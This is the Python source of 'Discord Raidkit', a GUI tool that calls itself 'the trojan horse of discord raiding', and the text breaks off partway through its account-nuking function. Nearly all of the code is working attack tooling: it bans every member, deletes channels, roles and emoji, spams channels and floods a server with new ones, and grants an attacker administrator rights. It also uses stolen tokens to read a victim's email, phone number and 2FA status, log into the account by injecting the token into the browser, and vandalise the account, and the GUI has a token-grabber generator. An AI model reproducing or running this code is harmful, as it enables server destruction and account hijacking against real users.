"""
Discord Raidkit v2.2.1 by the-cult-of-integral
"The trojan horse of discord raiding"
Last updated: 16/06/2022
"""

import asyncio
import logging
import os
import random
import sys
import webbrowser
from datetime import datetime
from itertools import cycle

import discord
import qdarktheme
import requests
from discord.ext import commands, tasks
from PyQt6 import QtWidgets
from qasync import QEventLoop, asyncSlot
from selenium import webdriver

import utils.dr_gui_utils as dru
from cogs.anubis.anubis_help import AnubisHelp
from cogs.anubis.moderation import Moderation
from cogs.anubis.raid_prevention import RaidPrevention
from cogs.anubis.surfing import Surfing
from cogs.qetesh.images import Images
from cogs.qetesh.qetesh_help import QeteshHelp
from cogs.shared.bot_err_and_config import BotErrAndConfig
from cogs.shared.status import Status
from gui.dr_dlg_admin import Ui_dlgAdmin
from gui.dr_dlg_cflood import Ui_dlgCflood
from gui.dr_dlg_confirmation import Ui_dlgConfirmation
from gui.dr_dlg_improper_token import Ui_dlgImproperToken
from gui.dr_dlg_windows_notice import Ui_dlgWindowsNotice
from gui.dr_dlg_mass_nuke import Ui_dlgMassNuke
from gui.dr_dlg_messages import Ui_dlgMessages
from gui.dr_dlg_new_update import Ui_dlgNewUpdate
from gui.dr_dlg_nicknames import Ui_dlgNicknames
from gui.dr_dlg_nuke import Ui_dlgNuke
from gui.dr_dlg_raid import Ui_dlgRaid
from gui.dr_dlg_server import Ui_dlgServer
from gui.dr_dlg_task_still_running import Ui_dlgTaskStillRunning
from gui.dr_dlg_token import Ui_dlgToken
from gui.dr_dlg_payload import Ui_dlgPayload
from gui.dr_window import Ui_MainWindow

# Constants & Globals

VERSION = "2.2.1"
THEMES = {0: "dark", 1: "light"}
CONFIG_PATH = "config_data.json"
CON_LOG_PATH = "logs/con_log.txt"
ERR_LOG_PATH = "logs/errors.log"
configuration = {}
guild_IDs = []
user_IDs = []
nicks = []
messages = []
channel_names = []
guild_ID = 0
user_ID = 0
channel_num = 0
channel_name = ""
rolename = ""
token = ""
webhook = ""
folder = ""
rpayload = ""
hpayload = ""
do_reg_key = False
launched = False
launch_after_yes = False
bot_starting = False
anubis_running = False
qetesh_running = False
osiris_running = False
leave_confirmation = False
stop_mass_nuke = False
halt_commands = False

if not os.path.isdir("logs"):
    os.mkdir("logs")

logging.basicConfig(
    filename="logs/errors.log",
    format="%(name)s - %(levelname)s - %(message)s - " +
    datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    level=logging.ERROR
)


# Main Window; the Discord Raidkit GUI.

class MainWindow(QtWidgets.QMainWindow, Ui_MainWindow):
    def __init__(self, parent=None) -> None:
        super().__init__(parent)
        self.ui = Ui_MainWindow()
        self.setupUi(self)
        self.txtBotToken.setText(configuration["bot_token"])
        self.txtPrefix.setText(configuration["bot_prefix"])
        
        if dru.get_latest_release() != VERSION:
            dlg = NewUpdateDialog()
            dlg.show()
            dlg.exec()
        
        self.client = ""

        # Buttons

        self.bot_btns_off(True)
        self.btnAStopCmds.setDisabled(True)
        self.btnQStopCmds.setDisabled(True)
        self.btnNextPage.setDisabled(False)
        self.btnPrevPage.setDisabled(False)
        self.btnStartAnubis.setDisabled(False)
        self.btnStartQetesh.setDisabled(False)
        self.btnOFindInfo.setDisabled(False)
        self.btnOLogIntoAccount.setDisabled(False)
        self.btnONukeAccount.setDisabled(False)
        self.btnOGenerateGrabber.setDisabled(False)
        
        self.btnClearLogs.clicked.connect(self.btn_clear_logs)
        self.btnViewGithub.clicked.connect(self.btn_view_github)
        self.btnConfigure.clicked.connect(self.btn_configure)
        self.btnNextPage.clicked.connect(self.btn_next_page_clicked)
        self.btnPrevPage.clicked.connect(self.btn_prev_page_clicked)
        
        self.btnStartAnubis.clicked.connect(self.btn_start_anubis)
        self.btnStartQetesh.clicked.connect(self.btn_start_qetesh)
        self.btnEndAnubis.clicked.connect(self.btn_end_bot)
        self.btnEndQetesh.clicked.connect(self.btn_end_bot)
        self.btnANickAll.clicked.connect(self.nick_all)
        self.btnAMsgAll.clicked.connect(self.msg_all)
        self.btnASpam.clicked.connect(self.spam)
        self.btnACpurge.clicked.connect(self.cpurge)
        self.btnACflood.clicked.connect(self.cflood)
        self.btnAAdmin.clicked.connect(self.admin)
        self.btnARaid.clicked.connect(self.raid)
        self.btnANuke.clicked.connect(self.nuke)
        self.btnAMassNuke.clicked.connect(self.mass_nuke)
        self.btnALeave.clicked.connect(self.leave)
        self.btnAMassLeave.clicked.connect(self.mass_leave)
        self.btnAStopCmds.clicked.connect(self.btn_stop_cmd)
        self.btnQNickAll.clicked.connect(self.nick_all)
        self.btnQMsgAll.clicked.connect(self.msg_all)
        self.btnQSpam.clicked.connect(self.spam)
        self.btnQCpurge.clicked.connect(self.cpurge)
        self.btnQCflood.clicked.connect(self.cflood)
        self.btnQAdmin.clicked.connect(self.admin)
        self.btnQRaid.clicked.connect(self.raid)
        self.btnQNuke.clicked.connect(self.nuke)
        self.btnQMassNuke.clicked.connect(self.mass_nuke)
        self.btnQLeave.clicked.connect(self.leave)
        self.btnQMassLeave.clicked.connect(self.mass_leave)
        self.btnQStopCmds.clicked.connect(self.btn_stop_cmd)
        self.btnOFindInfo.clicked.connect(self.find_info)
        self.btnOLogIntoAccount.clicked.connect(self.login)
        self.btnOGetBrowser.clicked.connect(self.btn_get_browser)
        self.btnONukeAccount.clicked.connect(self.nuke_account)
        self.btnOGenerateGrabber.clicked.connect(self.generate_grabber)
        
        self.actionUse_Dark_Theme.triggered.connect(lambda: self.change_theme(theme="dark"))
        self.actionUse_Light_Theme.triggered.connect(lambda: self.change_theme(theme="light"))

        return
    
    def btn_configure(self) -> None:
        global configuration
        token = self.txtBotToken.text()
        prefix = self.txtPrefix.text()
        dru.write_config(CONFIG_PATH, token, prefix)
        configuration = dru.do_config_setup(CONFIG_PATH)
        return

    def btn_next_page_clicked(self) -> None:
        if not anubis_running and not qetesh_running:
            if self.drStkWid.currentIndex() == 3:
                self.drStkWid.setCurrentIndex(0)
            else:
                self.drStkWid.setCurrentIndex(
                    self.drStkWid.currentIndex() + 1
                )
        else:
            if self.drStkWid.currentIndex() == 1 or self.drStkWid.currentIndex() == 2:
                self.drStkWid.setCurrentIndex(3)
            elif self.drStkWid.currentIndex() == 3:
                if anubis_running:
                    self.drStkWid.setCurrentIndex(1)
                elif qetesh_running:
                    self.drStkWid.setCurrentIndex(2)

    def btn_prev_page_clicked(self) -> None:
        if not anubis_running and not qetesh_running:
            if self.drStkWid.currentIndex() == 0:
                self.drStkWid.setCurrentIndex(3)
            else:
                self.drStkWid.setCurrentIndex(
                    self.drStkWid.currentIndex() - 1
                )
        else:
            if self.drStkWid.currentIndex() == 1 or self.drStkWid.currentIndex() == 2:
                self.drStkWid.setCurrentIndex(3)
            elif self.drStkWid.currentIndex() == 3:
                if anubis_running:
                    self.drStkWid.setCurrentIndex(1)
                elif qetesh_running:
                    self.drStkWid.setCurrentIndex(2)

    def page_btns_off(self, boolean) -> None:
        self.btnNextPage.setDisabled(boolean)
        self.btnPrevPage.setDisabled(boolean)

    def bot_btns_off(self, boolean) -> None:
        self.btnNextPage.setDisabled(boolean)
        self.btnPrevPage.setDisabled(boolean)
        self.btnStartAnubis.setDisabled(boolean)
        self.btnEndAnubis.setDisabled(boolean)
        self.btnAAdmin.setDisabled(boolean)
        self.btnACpurge.setDisabled(boolean)
        self.btnACflood.setDisabled(boolean)
        self.btnALeave.setDisabled(boolean)
        self.btnAMassLeave.setDisabled(boolean)
        self.btnAMassNuke.setDisabled(boolean)
        self.btnAMsgAll.setDisabled(boolean)
        self.btnANickAll.setDisabled(boolean)
        self.btnANuke.setDisabled(boolean)
        self.btnARaid.setDisabled(boolean)
        self.btnASpam.setDisabled(boolean)
        self.btnAStopCmds.setDisabled(boolean)
        self.btnStartQetesh.setDisabled(boolean)
        self.btnEndQetesh.setDisabled(boolean)
        self.btnQAdmin.setDisabled(boolean)
        self.btnQCpurge.setDisabled(boolean)
        self.btnQCflood.setDisabled(boolean)
        self.btnQLeave.setDisabled(boolean)
        self.btnQMassLeave.setDisabled(boolean)
        self.btnQMassNuke.setDisabled(boolean)
        self.btnQMsgAll.setDisabled(boolean)
        self.btnQNickAll.setDisabled(boolean)
        self.btnQNuke.setDisabled(boolean)
        self.btnQRaid.setDisabled(boolean)
        self.btnQSpam.setDisabled(boolean)
        self.btnQStopCmds.setDisabled(boolean)

    def osiris_btns_off(self, boolean) -> None:
        self.btnOFindInfo.setDisabled(boolean)
        self.btnOLogIntoAccount.setDisabled(boolean)
        self.btnONukeAccount.setDisabled(boolean)
        self.btnOGenerateGrabber.setDisabled(boolean)

    def btn_view_github(self) -> None:
        webbrowser.open(
            "https://github.com/the-cult-of-integral/discord-raidkit", new=2
        )
        return
    
    def btn_get_browser(self) -> None:
        webbrowser.open(
            "https://drive.google.com/file/d/1tx4QnZdCEDfT9MLh3SXIVlqcm_SrQ3P8/view", new=2
        )
        return

    def btn_clear_logs(self) -> None:
        with open(ERR_LOG_PATH, "w") as f:
            pass
        with open(CON_LOG_PATH, "w") as f:
            pass
    
    def btn_stop_cmd(self) -> None:
        global halt_commands
        halt_commands = True
        self.btnAStopCmds.setDisabled(True)
        self.btnQStopCmds.setDisabled(True)

    def change_theme(self, theme) -> None:
        dru.write_config(CONFIG_PATH, theme=theme)
        stylesheet = qdarktheme.load_stylesheet(theme)
        QtWidgets.QApplication.instance().setStyleSheet(stylesheet)
        return

    def closeEvent(self, event) -> None:
        if anubis_running or qetesh_running or osiris_running: 
            event.ignore()
        else:
            event.accept()
        return
    
    # Anubis Management

    @asyncSlot()
    async def btn_start_anubis(self) -> None:
        """Start anubis using data from config_data.json.
        """
        global bot_starting
        global anubis_running
        intents = discord.Intents.default()
        intents.members = True
        if not configuration["bot_prefix"]:
            prefix = "a!"
        else:
            prefix = configuration["bot_prefix"]
        self.client = Anubis(
            command_prefix=prefix,
            intents=intents,
            self_bot=False,
        )
        self.client.add_cog(BotErrAndConfig(self.client))
        self.client.add_cog(Status(self.client))
        self.client.add_cog(Surfing(self.client))
        self.client.add_cog(RaidPrevention(self.client))
        self.client.add_cog(Moderation(self.client))
        self.client.add_cog(AnubisHelp(self.client))
        try:
            self.bot_btns_off(False)
            self.btnStartAnubis.setDisabled(True)
            self.btnAStopCmds.setDisabled(True)
            bot_starting = True
            try:
                anubis_running = True
                await self.client.start(configuration["bot_token"])
                bot_starting = False
            except discord.errors.LoginFailure as e:
                await self.client.close()
                self.client = ""
                anubis_running = False
                bot_starting = False
                self.bot_btns_off(True)
                self.page_btns_off(True)
                dlg = ImproperTokenDialog()
                dlg.show()
                dlg.exec()
                self.btnStartQetesh.setDisabled(False)
                self.btnStartAnubis.setDisabled(False)
                self.page_btns_off(False)
            except BaseException as e:
                await self.client.close()
                self.client = ""
                logging.error(f"err starting anubis: {e}")
                bot_starting = False
                anubis_running = False
                self.bot_btns_off(True)
                self.btnStartAnubis.setDisabled(False)
                self.btnStartQetesh.setDisabled(False)
                self.page_btns_off(False)
        except:
            bot_starting = False
            anubis_running = False

    # Qetesh Management

    @asyncSlot()
    async def btn_start_qetesh(self) -> None:
        """Start qetesh using data from config_data.json.
        """
        global bot_starting
        global qetesh_running
        intents = discord.Intents.default()
        intents.members = True
        if not configuration["bot_prefix"]:
            prefix = "q!"
        else:
            prefix = configuration["bot_prefix"]
        self.client = Qetesh(
            command_prefix=prefix,
            intents=intents,
            self_bot=False,
        )
        self.client.add_cog(BotErrAndConfig(self.client))
        self.client.add_cog(Status(self.client))
        self.client.add_cog(Images(self.client))
        self.client.add_cog(QeteshHelp(self.client))
        try:
            self.bot_btns_off(False)
            self.btnStartQetesh.setDisabled(True)
            self.btnQStopCmds.setDisabled(True)
            bot_starting = True
            try:
                qetesh_running = True
                await self.client.start(configuration["bot_token"])
                bot_starting = False
            except discord.errors.LoginFailure as e:
                await self.client.close()
                self.client = ""
                qetesh_running = False
                bot_starting = False
                self.bot_btns_off(True)
                self.page_btns_off(True)
                dlg = ImproperTokenDialog()
                dlg.show()
                dlg.exec()
                self.btnStartQetesh.setDisabled(False)
                self.btnStartAnubis.setDisabled(False)
                self.page_btns_off(False)
            except BaseException as e:
                await self.client.close()
                self.client = ""
                logging.error(f"err starting qetesh: {e}")
                qetesh_running = False
                bot_starting = False
                self.bot_btns_off(True)
                self.btnStartQetesh.setDisabled(False)
                self.btnStartAnubis.setDisabled(False)
                self.page_btns_off(False)
        except:
            bot_starting = False
            qetesh_running = False

    @asyncSlot()
    async def btn_end_bot(self) -> None:
        global anubis_running
        global qetesh_running
        if bot_starting:
            return
        elif anubis_running:
            anubis_running = False
        elif qetesh_running:
            qetesh_running = False
        try:
            await self.client.close()
            self.client = ""
            self.bot_btns_off(True)
            self.btnStartAnubis.setDisabled(False)
            self.btnStartQetesh.setDisabled(False)
            self.btnNextPage.setDisabled(False)
            self.btnPrevPage.setDisabled(False)
        except:
            pass

    # Anubis/Qetesh Commands

    def end_of_cmd(self) -> None:
        self.page_btns_off(False)
        self.bot_btns_off(False)
        self.btnStartAnubis.setDisabled(True)
        self.btnStartQetesh.setDisabled(True)
        self.btnAStopCmds.setDisabled(True)
        self.btnQStopCmds.setDisabled(True)

    @asyncSlot()
    async def nick_all(self) -> None:
        """Nickname every member in a guild.
        """
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = NicknamesDialog()
        dlg.show()
        dlg.exec()
        dlg.close()
        if not guild_ID or not nicks:
            self.end_of_cmd()
        else:
            try:
                self.btnAStopCmds.setDisabled(False)
                self.btnQStopCmds.setDisabled(False)
                g = discord.utils.get(self.client.guilds, id=guild_ID)

                if len(nicks) == 1:
                    for member in g.members:
                        if halt_commands:
                            break
                        try:
                            await member.edit(nick=nicks[0])
                        except discord.errors.HTTPException as e:
                            logging.error(f"A/Q: nick_all: {e}")
                else:
                    for member in g.members:
                        if halt_commands:
                            break
                        try:
                            await member.edit(nick=random.choice(nicks))
                        except discord.errors.HTTPException as e:
                            logging.error(f"A/Q: nick_all: {e}")

                halt_commands = False
                self.end_of_cmd()

            except BaseException as e:
                logging.error(f"A/Q: nick_all: {e}")
                halt_commands = False
                self.end_of_cmd()

    @asyncSlot()
    async def msg_all(self) -> None:
        """Message every member in a guild.
        """
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = MessagesDialog()
        dlg.show()
        dlg.exec()
        if not guild_ID or not messages:
            self.end_of_cmd()
        else:
            try:
                self.btnAStopCmds.setDisabled(False)
                self.btnQStopCmds.setDisabled(False)
                g = discord.utils.get(self.client.guilds, id=guild_ID)

                if len(messages) == 1:
                    for member in g.members:
                        if halt_commands:
                            break
                        try:
                            if member.id == self.client.user.id:
                                pass
                            else:
                                await member.send(messages[0])
                        except discord.errors.HTTPException as e:
                            logging.error(f"A/Q: msg_all: {e}")
                else:
                    for member in g.members:
                        if halt_commands:
                            break
                        try:
                            if member.id == self.client.user.id:
                                pass
                            else:
                                await member.send(random.choice(messages))
                        except discord.errors.HTTPException as e:
                            logging.error(f"A/Q: msg_all: {e}")

                halt_commands = False
                self.end_of_cmd()

            except BaseException as e:
                logging.error(f"A/Q: msg_all: {e}")
                halt_commands = False
                self.end_of_cmd()

    @asyncSlot()
    async def spam(self) -> None:
        """Spam every channel in a guild.
        """
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = MessagesDialog()
        dlg.show()
        dlg.exec()
        if not guild_ID or not messages:
            self.end_of_cmd()
        else:
            try:
                self.btnAStopCmds.setDisabled(False)
                self.btnQStopCmds.setDisabled(False)
                g = discord.utils.get(self.client.guilds, id=guild_ID)

                def check_halt(none) -> bool:
                    return halt_commands

                if len(messages) == 1:

                    async def spam_text() -> None:
                        self.btnEndAnubis.setDisabled(False)
                        self.btnEndQetesh.setDisabled(False)
                        while True:
                            for channel in g.text_channels:
                                try:
                                    await channel.send(messages[0])
                                except discord.errors.HTTPException as e:
                                    logging.error(f"A/Q: spam: {e}")

                    if not halt_commands:
                        spam_task = self.client.loop.create_task(spam_text())
                        await self.client.wait_for("message", check=check_halt)
                        spam_task.cancel()
                else:

                    async def spam_text() -> None:
                        self.btnEndAnubis.setDisabled(False)
                        self.btnEndQetesh.setDisabled(False)
                        while True:
                            for channel in g.text_channels:
                                try:
                                    await channel.send(random.choice(messages))
                                except discord.errors.HTTPException as e:
                                    logging.error(f"A/Q: spam: {e}")

                    if not halt_commands:
                        spam_task = self.client.loop.create_task(spam_text())
                        await self.client.wait_for("message", check=check_halt)
                        spam_task.cancel()

                halt_commands = False
                self.end_of_cmd()

            except BaseException as e:
                logging.error(f"A/Q: spam: {e}")
                halt_commands = False
                self.end_of_cmd()

    @asyncSlot()
    async def cpurge(self) -> None:
        """Delete every channel in a guild.
        """
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = ServerDialog()
        dlg.show()
        dlg.exec()
        if not guild_ID:
            self.end_of_cmd()
        else:
            try:
                self.btnAStopCmds.setDisabled(False)
                self.btnQStopCmds.setDisabled(False)
                g = discord.utils.get(self.client.guilds, id=guild_ID)

                for c in g.channels:
                    if halt_commands:
                        break
                    try:
                        await c.delete()
                    except discord.errors.HTTPException as e:
                        logging.error(f"A/Q: cpurge: {e}")

                halt_commands = False
                self.end_of_cmd()

            except BaseException as e:
                logging.error(f"A/Q: cpurge: {e}")
                halt_commands = False
                self.end_of_cmd()
    
    @asyncSlot()
    async def cflood(self) -> None:
        """Flood a guild with channels.
        """
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = CfloodDialog()
        dlg.show()
        dlg.exec()
        if not guild_ID:
            self.end_of_cmd()
        else:
            try:
                self.btnAStopCmds.setDisabled(False)
                self.btnQStopCmds.setDisabled(False)
                g = discord.utils.get(self.client.guilds, id=guild_ID)

                for i in range(channel_num):
                    if halt_commands:
                        break
                    try:
                        await g.create_text_channel(random.choice(channel_names))
                    except discord.errors.HTTPException as e:
                        logging.error(f"A/Q: cflood: {e}")

                halt_commands = False
                self.end_of_cmd()

            except BaseException as e:
                logging.error(f"A/Q: cflood: {e}")
                halt_commands = False
                self.end_of_cmd()

    @asyncSlot()
    async def admin(self) -> None:
        """Give a member in a server a role with administrator permissions.
        """
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = AdminDialog()
        dlg.show()
        dlg.exec()
        if not guild_ID:
            self.end_of_cmd()
        else:
            try:
                self.btnAStopCmds.setDisabled(False)
                self.btnQStopCmds.setDisabled(False)
                g = discord.utils.get(self.client.guilds, id=guild_ID)

                await g.create_role(
                    name=rolename,
                    permissions=discord.Permissions.all()
                )
                role = discord.utils.get(g.roles, name=rolename)
                member = g.get_member(user_ID)
                try:
                    await member.add_roles(role)
                except discord.errors.HTTPException as e:
                    logging.error(f"A/Q: admin: {e}")

                halt_commands = False
                self.end_of_cmd()

            except BaseException as e:
                logging.error(f"A/Q: admin: {e}")
                halt_commands = False
                self.end_of_cmd()

    @asyncSlot()
    async def raid(self) -> None:
        """Raid a guild
        Note: can be quite buggy!
        """
        ###
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = RaidDialog()
        dlg.show()
        dlg.exec()
        if not guild_ID or not nicks \
            or not channel_names or not channel_num \
            or not messages:
            self.end_of_cmd()
            return
        try:
            self.btnAStopCmds.setDisabled(False)
            self.btnQStopCmds.setDisabled(False)
            g = discord.utils.get(self.client.guilds, id=guild_ID)

            # Delete all channels

            for c in g.channels:
                if halt_commands:
                    break
                try:
                    await c.delete()
                except discord.Forbidden:
                    continue

            # Delete all roles

            roles = g.roles
            roles.pop(0)
            for r in roles:
                if halt_commands:
                    break
                if g.me.roles[-1] > r:
                    try:
                        await r.delete()
                    except BaseException as e:
                        logging.error(f"A/Q: raid: {e}")
                        continue
                else:
                    break

            # Nickname all members

            for m in g.members:
                if halt_commands:
                    break
                try:
                    nick = random.choice(nicks)
                    await m.edit(nick=nick)
                except BaseException as e:
                    logging.error(f"A/Q: raid: {e}")
                    continue

            # Create i number of named channels

            for i in range(channel_num):
                if halt_commands:
                    break
                try:
                    name = random.choice(channel_names)
                    await g.create_text_channel(name)
                except BaseException as e:
                    logging.error(f"A/Q: raid: {e}")
                    continue

            # Raid all text channels

            def check_halt(none) -> bool:
                return halt_commands

            if len(messages) == 1:

                async def spam_text() -> None:
                    self.btnEndAnubis.setDisabled(False)
                    self.btnEndQetesh.setDisabled(False)
                    while True:
                        for channel in g.text_channels:
                            try:
                                await channel.send(messages[0])
                            except discord.errors.HTTPException as e:
                                logging.error(f"A/Q: spam: {e}")

                if not halt_commands:
                    spam_task = self.client.loop.create_task(spam_text())
                    await self.client.wait_for("message", check=check_halt)
                    spam_task.cancel()
            else:

                async def spam_text() -> None:
                    self.btnEndAnubis.setDisabled(False)
                    self.btnEndQetesh.setDisabled(False)
                    while True:
                        for channel in g.text_channels:
                            try:
                                await channel.send(random.choice(messages))
                            except discord.errors.HTTPException as e:
                                logging.error(f"A/Q: spam: {e}")

                if not halt_commands:
                    spam_task = self.client.loop.create_task(spam_text())
                    await self.client.wait_for("message", check=check_halt)
                    spam_task.cancel()

            halt_commands = False
            self.end_of_cmd()

        except BaseException as e:
            logging.error(f"A/Q: raid: {e}")
            halt_commands = False
            self.end_of_cmd()

    @asyncSlot()
    async def nuke(self) -> None:
        """Nuke a server.
        """
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = NukeDialog()
        dlg.show()
        dlg.exec()
        if not guild_ID:
            self.end_of_cmd()
        else:
            try:
                self.btnAStopCmds.setDisabled(False)
                self.btnQStopCmds.setDisabled(False)
                g = discord.utils.get(self.client.guilds, id=guild_ID)

                # Ban all members

                for member in g.members:
                    if halt_commands:
                        break
                    if member.id not in user_IDs:
                        try:
                            await member.ban()
                        except discord.errors.HTTPException as e:
                            logging.error(f"A/Q: nuke: {e}")

                # Delete all channels

                for c in g.channels:
                    if halt_commands:
                        break
                    try:
                        await c.delete()
                    except discord.errors.HTTPException as e:
                        logging.error(f"A/Q: nuke: {e}")

                # Delete all roles

                roles = g.roles
                roles.pop(0)
                for role in roles:
                    if halt_commands:
                        break
                    if g.me.roles[-1] > role:
                        try:
                            await role.delete()
                        except discord.errors.HTTPException as e:
                            logging.error(f"A/Q: nuke: {e}")

                # Delete all emoji

                for emoji in g.emojis:
                    if halt_commands:
                        break
                    try:
                        await emoji.delete()
                    except discord.errors.HTTPException as e:
                        logging.error(f"A/Q: nuke: {e}")

                halt_commands = False
                self.end_of_cmd()

            except BaseException as e:
                logging.error(f"A/Q: nuke: {e}")
                halt_commands = False
                self.end_of_cmd()

    @asyncSlot()
    async def mass_nuke(self) -> None:
        """Nuke all servers bot is in.
        """
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = MassNukeDialog()
        dlg.show()
        dlg.exec()
        if stop_mass_nuke:
            self.end_of_cmd()
        else:
            try:
                self.btnAStopCmds.setDisabled(False)
                self.btnQStopCmds.setDisabled(False)

                for g in self.client.guilds:
                    if halt_commands:
                        break

                    # Ban all members

                    for member in g.members:
                        if halt_commands:
                            break
                        if member.id not in user_IDs:
                            try:
                                await member.ban()
                            except discord.errors.HTTPException as e:
                                logging.error(f"A/Q: mass_nuke: {e}")

                    # Delete all channels

                    for c in g.channels:
                        if halt_commands:
                            break
                        try:
                            await c.delete()
                        except discord.errors.HTTPException as e:
                            logging.error(f"A/Q: mass_nuke: {e}")

                    # Delete all roles

                    roles = g.roles
                    roles.pop(0)
                    for role in roles:
                        if halt_commands:
                            break
                        if g.me.roles[-1] > role:
                            try:
                                await role.delete()
                            except discord.errors.HTTPException as e:
                                logging.error(f"A/Q: mass_nuke: {e}")

                    # Delete all emoji

                    for emoji in g.emojis:
                        if halt_commands:
                            break
                        try:
                            await emoji.delete()
                        except discord.errors.HTTPException as e:
                            logging.error(f"A/Q: mass_nuke: {e}")

                    halt_commands = False
                    self.end_of_cmd()

            except BaseException as e:
                logging.error(f"A/Q: mass_nuke: {e}")
                halt_commands = False
                self.end_of_cmd()

    @asyncSlot()
    async def leave(self) -> None:
        """Leave a server.
        """
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = ServerDialog()
        dlg.show()
        dlg.exec()
        if not guild_ID:
            self.end_of_cmd()
        else:
            try:
                self.btnAStopCmds.setDisabled(False)
                self.btnQStopCmds.setDisabled(False)
                g = discord.utils.get(self.client.guilds, id=guild_ID)

                try:
                    await g.leave()
                except discord.errors.HTTPException as e:
                    logging.error(f"A/Q: leave: {e}")

                halt_commands = False
                self.end_of_cmd()

            except BaseException as e:
                logging.error(f"A/Q: leave: {e}")
                halt_commands = False
                self.end_of_cmd()

    @asyncSlot()
    async def mass_leave(self) -> None:
        """Leave a server.
        """
        global halt_commands
        if bot_starting:
            return
        self.bot_btns_off(True)
        dlg = ConfirmationDialog()
        dlg.show()
        dlg.exec()
        if not leave_confirmation:
            self.end_of_cmd()
        else:
            try:
                self.btnAStopCmds.setDisabled(False)
                self.btnQStopCmds.setDisabled(False)

                for g in self.client.guilds:
                    if halt_commands:
                        break
                    try:
                        await g.leave()
                    except discord.errors.HTTPException as e:
                        logging.error(f"A/Q: mass_leave: {e}")

                halt_commands = False
                self.end_of_cmd()

            except BaseException as e:
                logging.error(f"A/Q: mass_leave: {e}")
                halt_commands = False
                self.end_of_cmd()

    # Osiris

    def find_info(self) -> None:
        """Find and display the following info about a discord token:
        - user_ID
        - username
        - 2FA; is it enabled or disabled?
        - account email
        - account phone number
        """
        global osiris_running
        osiris_running = True
        self.osiris_btns_off(True)
        self.page_btns_off(True)
        dlg = TokenDialog()
        dlg.show()
        dlg.exec()
        if token == "False":
            self.osiris_btns_off(False)
            self.page_btns_off(False)
            osiris_running = False
            return
        try:
            headers = {
                "Authorization": token,
                "Content-Type": "application/json"
            }
            r = requests.get(
                "https://discord.com/api/v6/users/@me",
                headers=headers)
            if r.status_code == 200:
                r = r.json()
                username = f"{r['username']}#{r['discriminator']}"
                userID = r["id"]
                twoFA = r["mfa_enabled"]
                email = r["email"]
                phone = r["phone"]
                self.txtOUserID.setText(f"{userID}")
                self.txtOUsername.setText(f"{username}")
                self.txtO2FA.setText(f"{twoFA}")
                self.txtOEmail.setText(f"{email}")
                self.txtOPhoneNum.setText(f"{phone}")
                self.osiris_btns_off(False)
                self.page_btns_off(False)
                osiris_running = False
            else:
                self.txtOUserID.setText("Find Info Fail: Invalid Token")
                self.txtOUsername.setText("Find Info Fail: Invalid Token")
                self.txtO2FA.setText("Find Info Fail: Invalid Token")
                self.txtOEmail.setText("Find Info Fail: Invalid Token")
                self.txtOPhoneNum.setText("Find Info Fail: Invalid Token")
                self.osiris_btns_off(False)
                self.page_btns_off(False)
                osiris_running = False
        except BaseException as e:
            logging.error(f"O: find_all(): {e}")
            self.osiris_btns_off(False)
            self.page_btns_off(False)
            osiris_running = False

    def login(self) -> None:
        """Login to a discord account via a token.
        """
        global osiris_running
        osiris_running = True
        self.osiris_btns_off(True)
        self.page_btns_off(True)
        dlg = TokenDialog()
        dlg.show()
        dlg.exec()
        if token == "False":
            self.osiris_btns_off(False)
            self.page_btns_off(False)
            osiris_running = False
            return
        try:
            headers = {
                "Authorization": token,
                "Content-Type": "application/json"
            }
            r = requests.get(
                "https://discord.com/api/v6/users/@me",
                headers=headers)
            if r.status_code == 200:
                webdriver.ChromeOptions.binary_location = r"browser\chrome.exe"
                opts = webdriver.ChromeOptions()
                opts.add_experimental_option("detach", True)
                driver = webdriver.Chrome(
                    r"browser\chromedriver.exe", options=opts)
                script = """
                        function login(token) {
                        setInterval(() => {
                        document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
                        }, 50);
                        setTimeout(() => {
                        location.reload();
                        }, 2500);
                        }
                        """
                driver.get("https://discord.com/login")
                driver.execute_script(script + f'\nlogin("{token}")')
                self.osiris_btns_off(False)
                self.page_btns_off(False)
                osiris_running = False
            else:
                self.txtOUserID.setText("Login Fail: Invalid Token")
                self.txtOUsername.setText("Login Fail: Invalid Token")
                self.txtO2FA.setText("Login Fail: Invalid Token")
                self.txtOEmail.setText("Login Fail: Invalid Token")
                self.txtOPhoneNum.setText("Login Fail: Invalid Token")
                self.osiris_btns_off(False)
                self.page_btns_off(False)
                osiris_running = False
        except BaseException as e:
            logging.error(f"O: login(): {e}")
            self.osiris_btns_off(False)
            self.page_btns_off(False)
            osiris_running = False

    def nuke_account(self) -> None:
        """Nuke a discord account via a token.
        """
        global guild_IDs
        global osiris_running

        def nuke_requests(headers) -> None:
            headers = headers

            for i in range(10):
                try:
                    payload = {
                        'name': 'Hacked by the-cult-of-integral\'s Discord Raidkit!',
                        'region': 'europe',
                        'icon': None,
                        'channels': None
                    }
                    requests.post(
                        'https://discord.com/api/v6/guilds',
                        headers=headers,
                        json=payload
                    )
                except BaseException as e:
                    logging.error(f"O: nuke_account(): {e}")

            settings = {
                "locale": "ja",
                "show_current_game": False,
                "default_guilds_restricted": True,
                "inline_attatchment_media": False,
                "inline_embed_media": False,
                "gif_auto_play": False,
                "render_embeds": False,
                "render_reactions": False,
                "animate_emoji": False,
                "enable_tts_command": False,
                "message_display_compact": True,
                "convert_emoticons": False,
                "explicit_content_filter": 0,
                "disable_games_tab": True,
                "theme": "light",
                "detect_platform_accounts": False,
                "stream_notifications_enabled": False,
                "animate_stickers": False,
                "view_nsfw_guilds": True,
            }

            requests.patch(
                "https://discord.com/api/v8/users/@me/settings",
                headers=headers,
                json=settings
            )
            return

        osiris_running = True
        self.osiris_btns_off(True)
        self.page_btns_off(True)

        dlg = TokenDialog()
        dlg.show()
        dlg.exec()
        if token == "False":
            self.osiris_btns_off(False)
            self.page_btns_off(False)
            osiris_running = False
            return
        try:
            headers = {
                "Authorization": token,
                "Content-Type": "application/json"
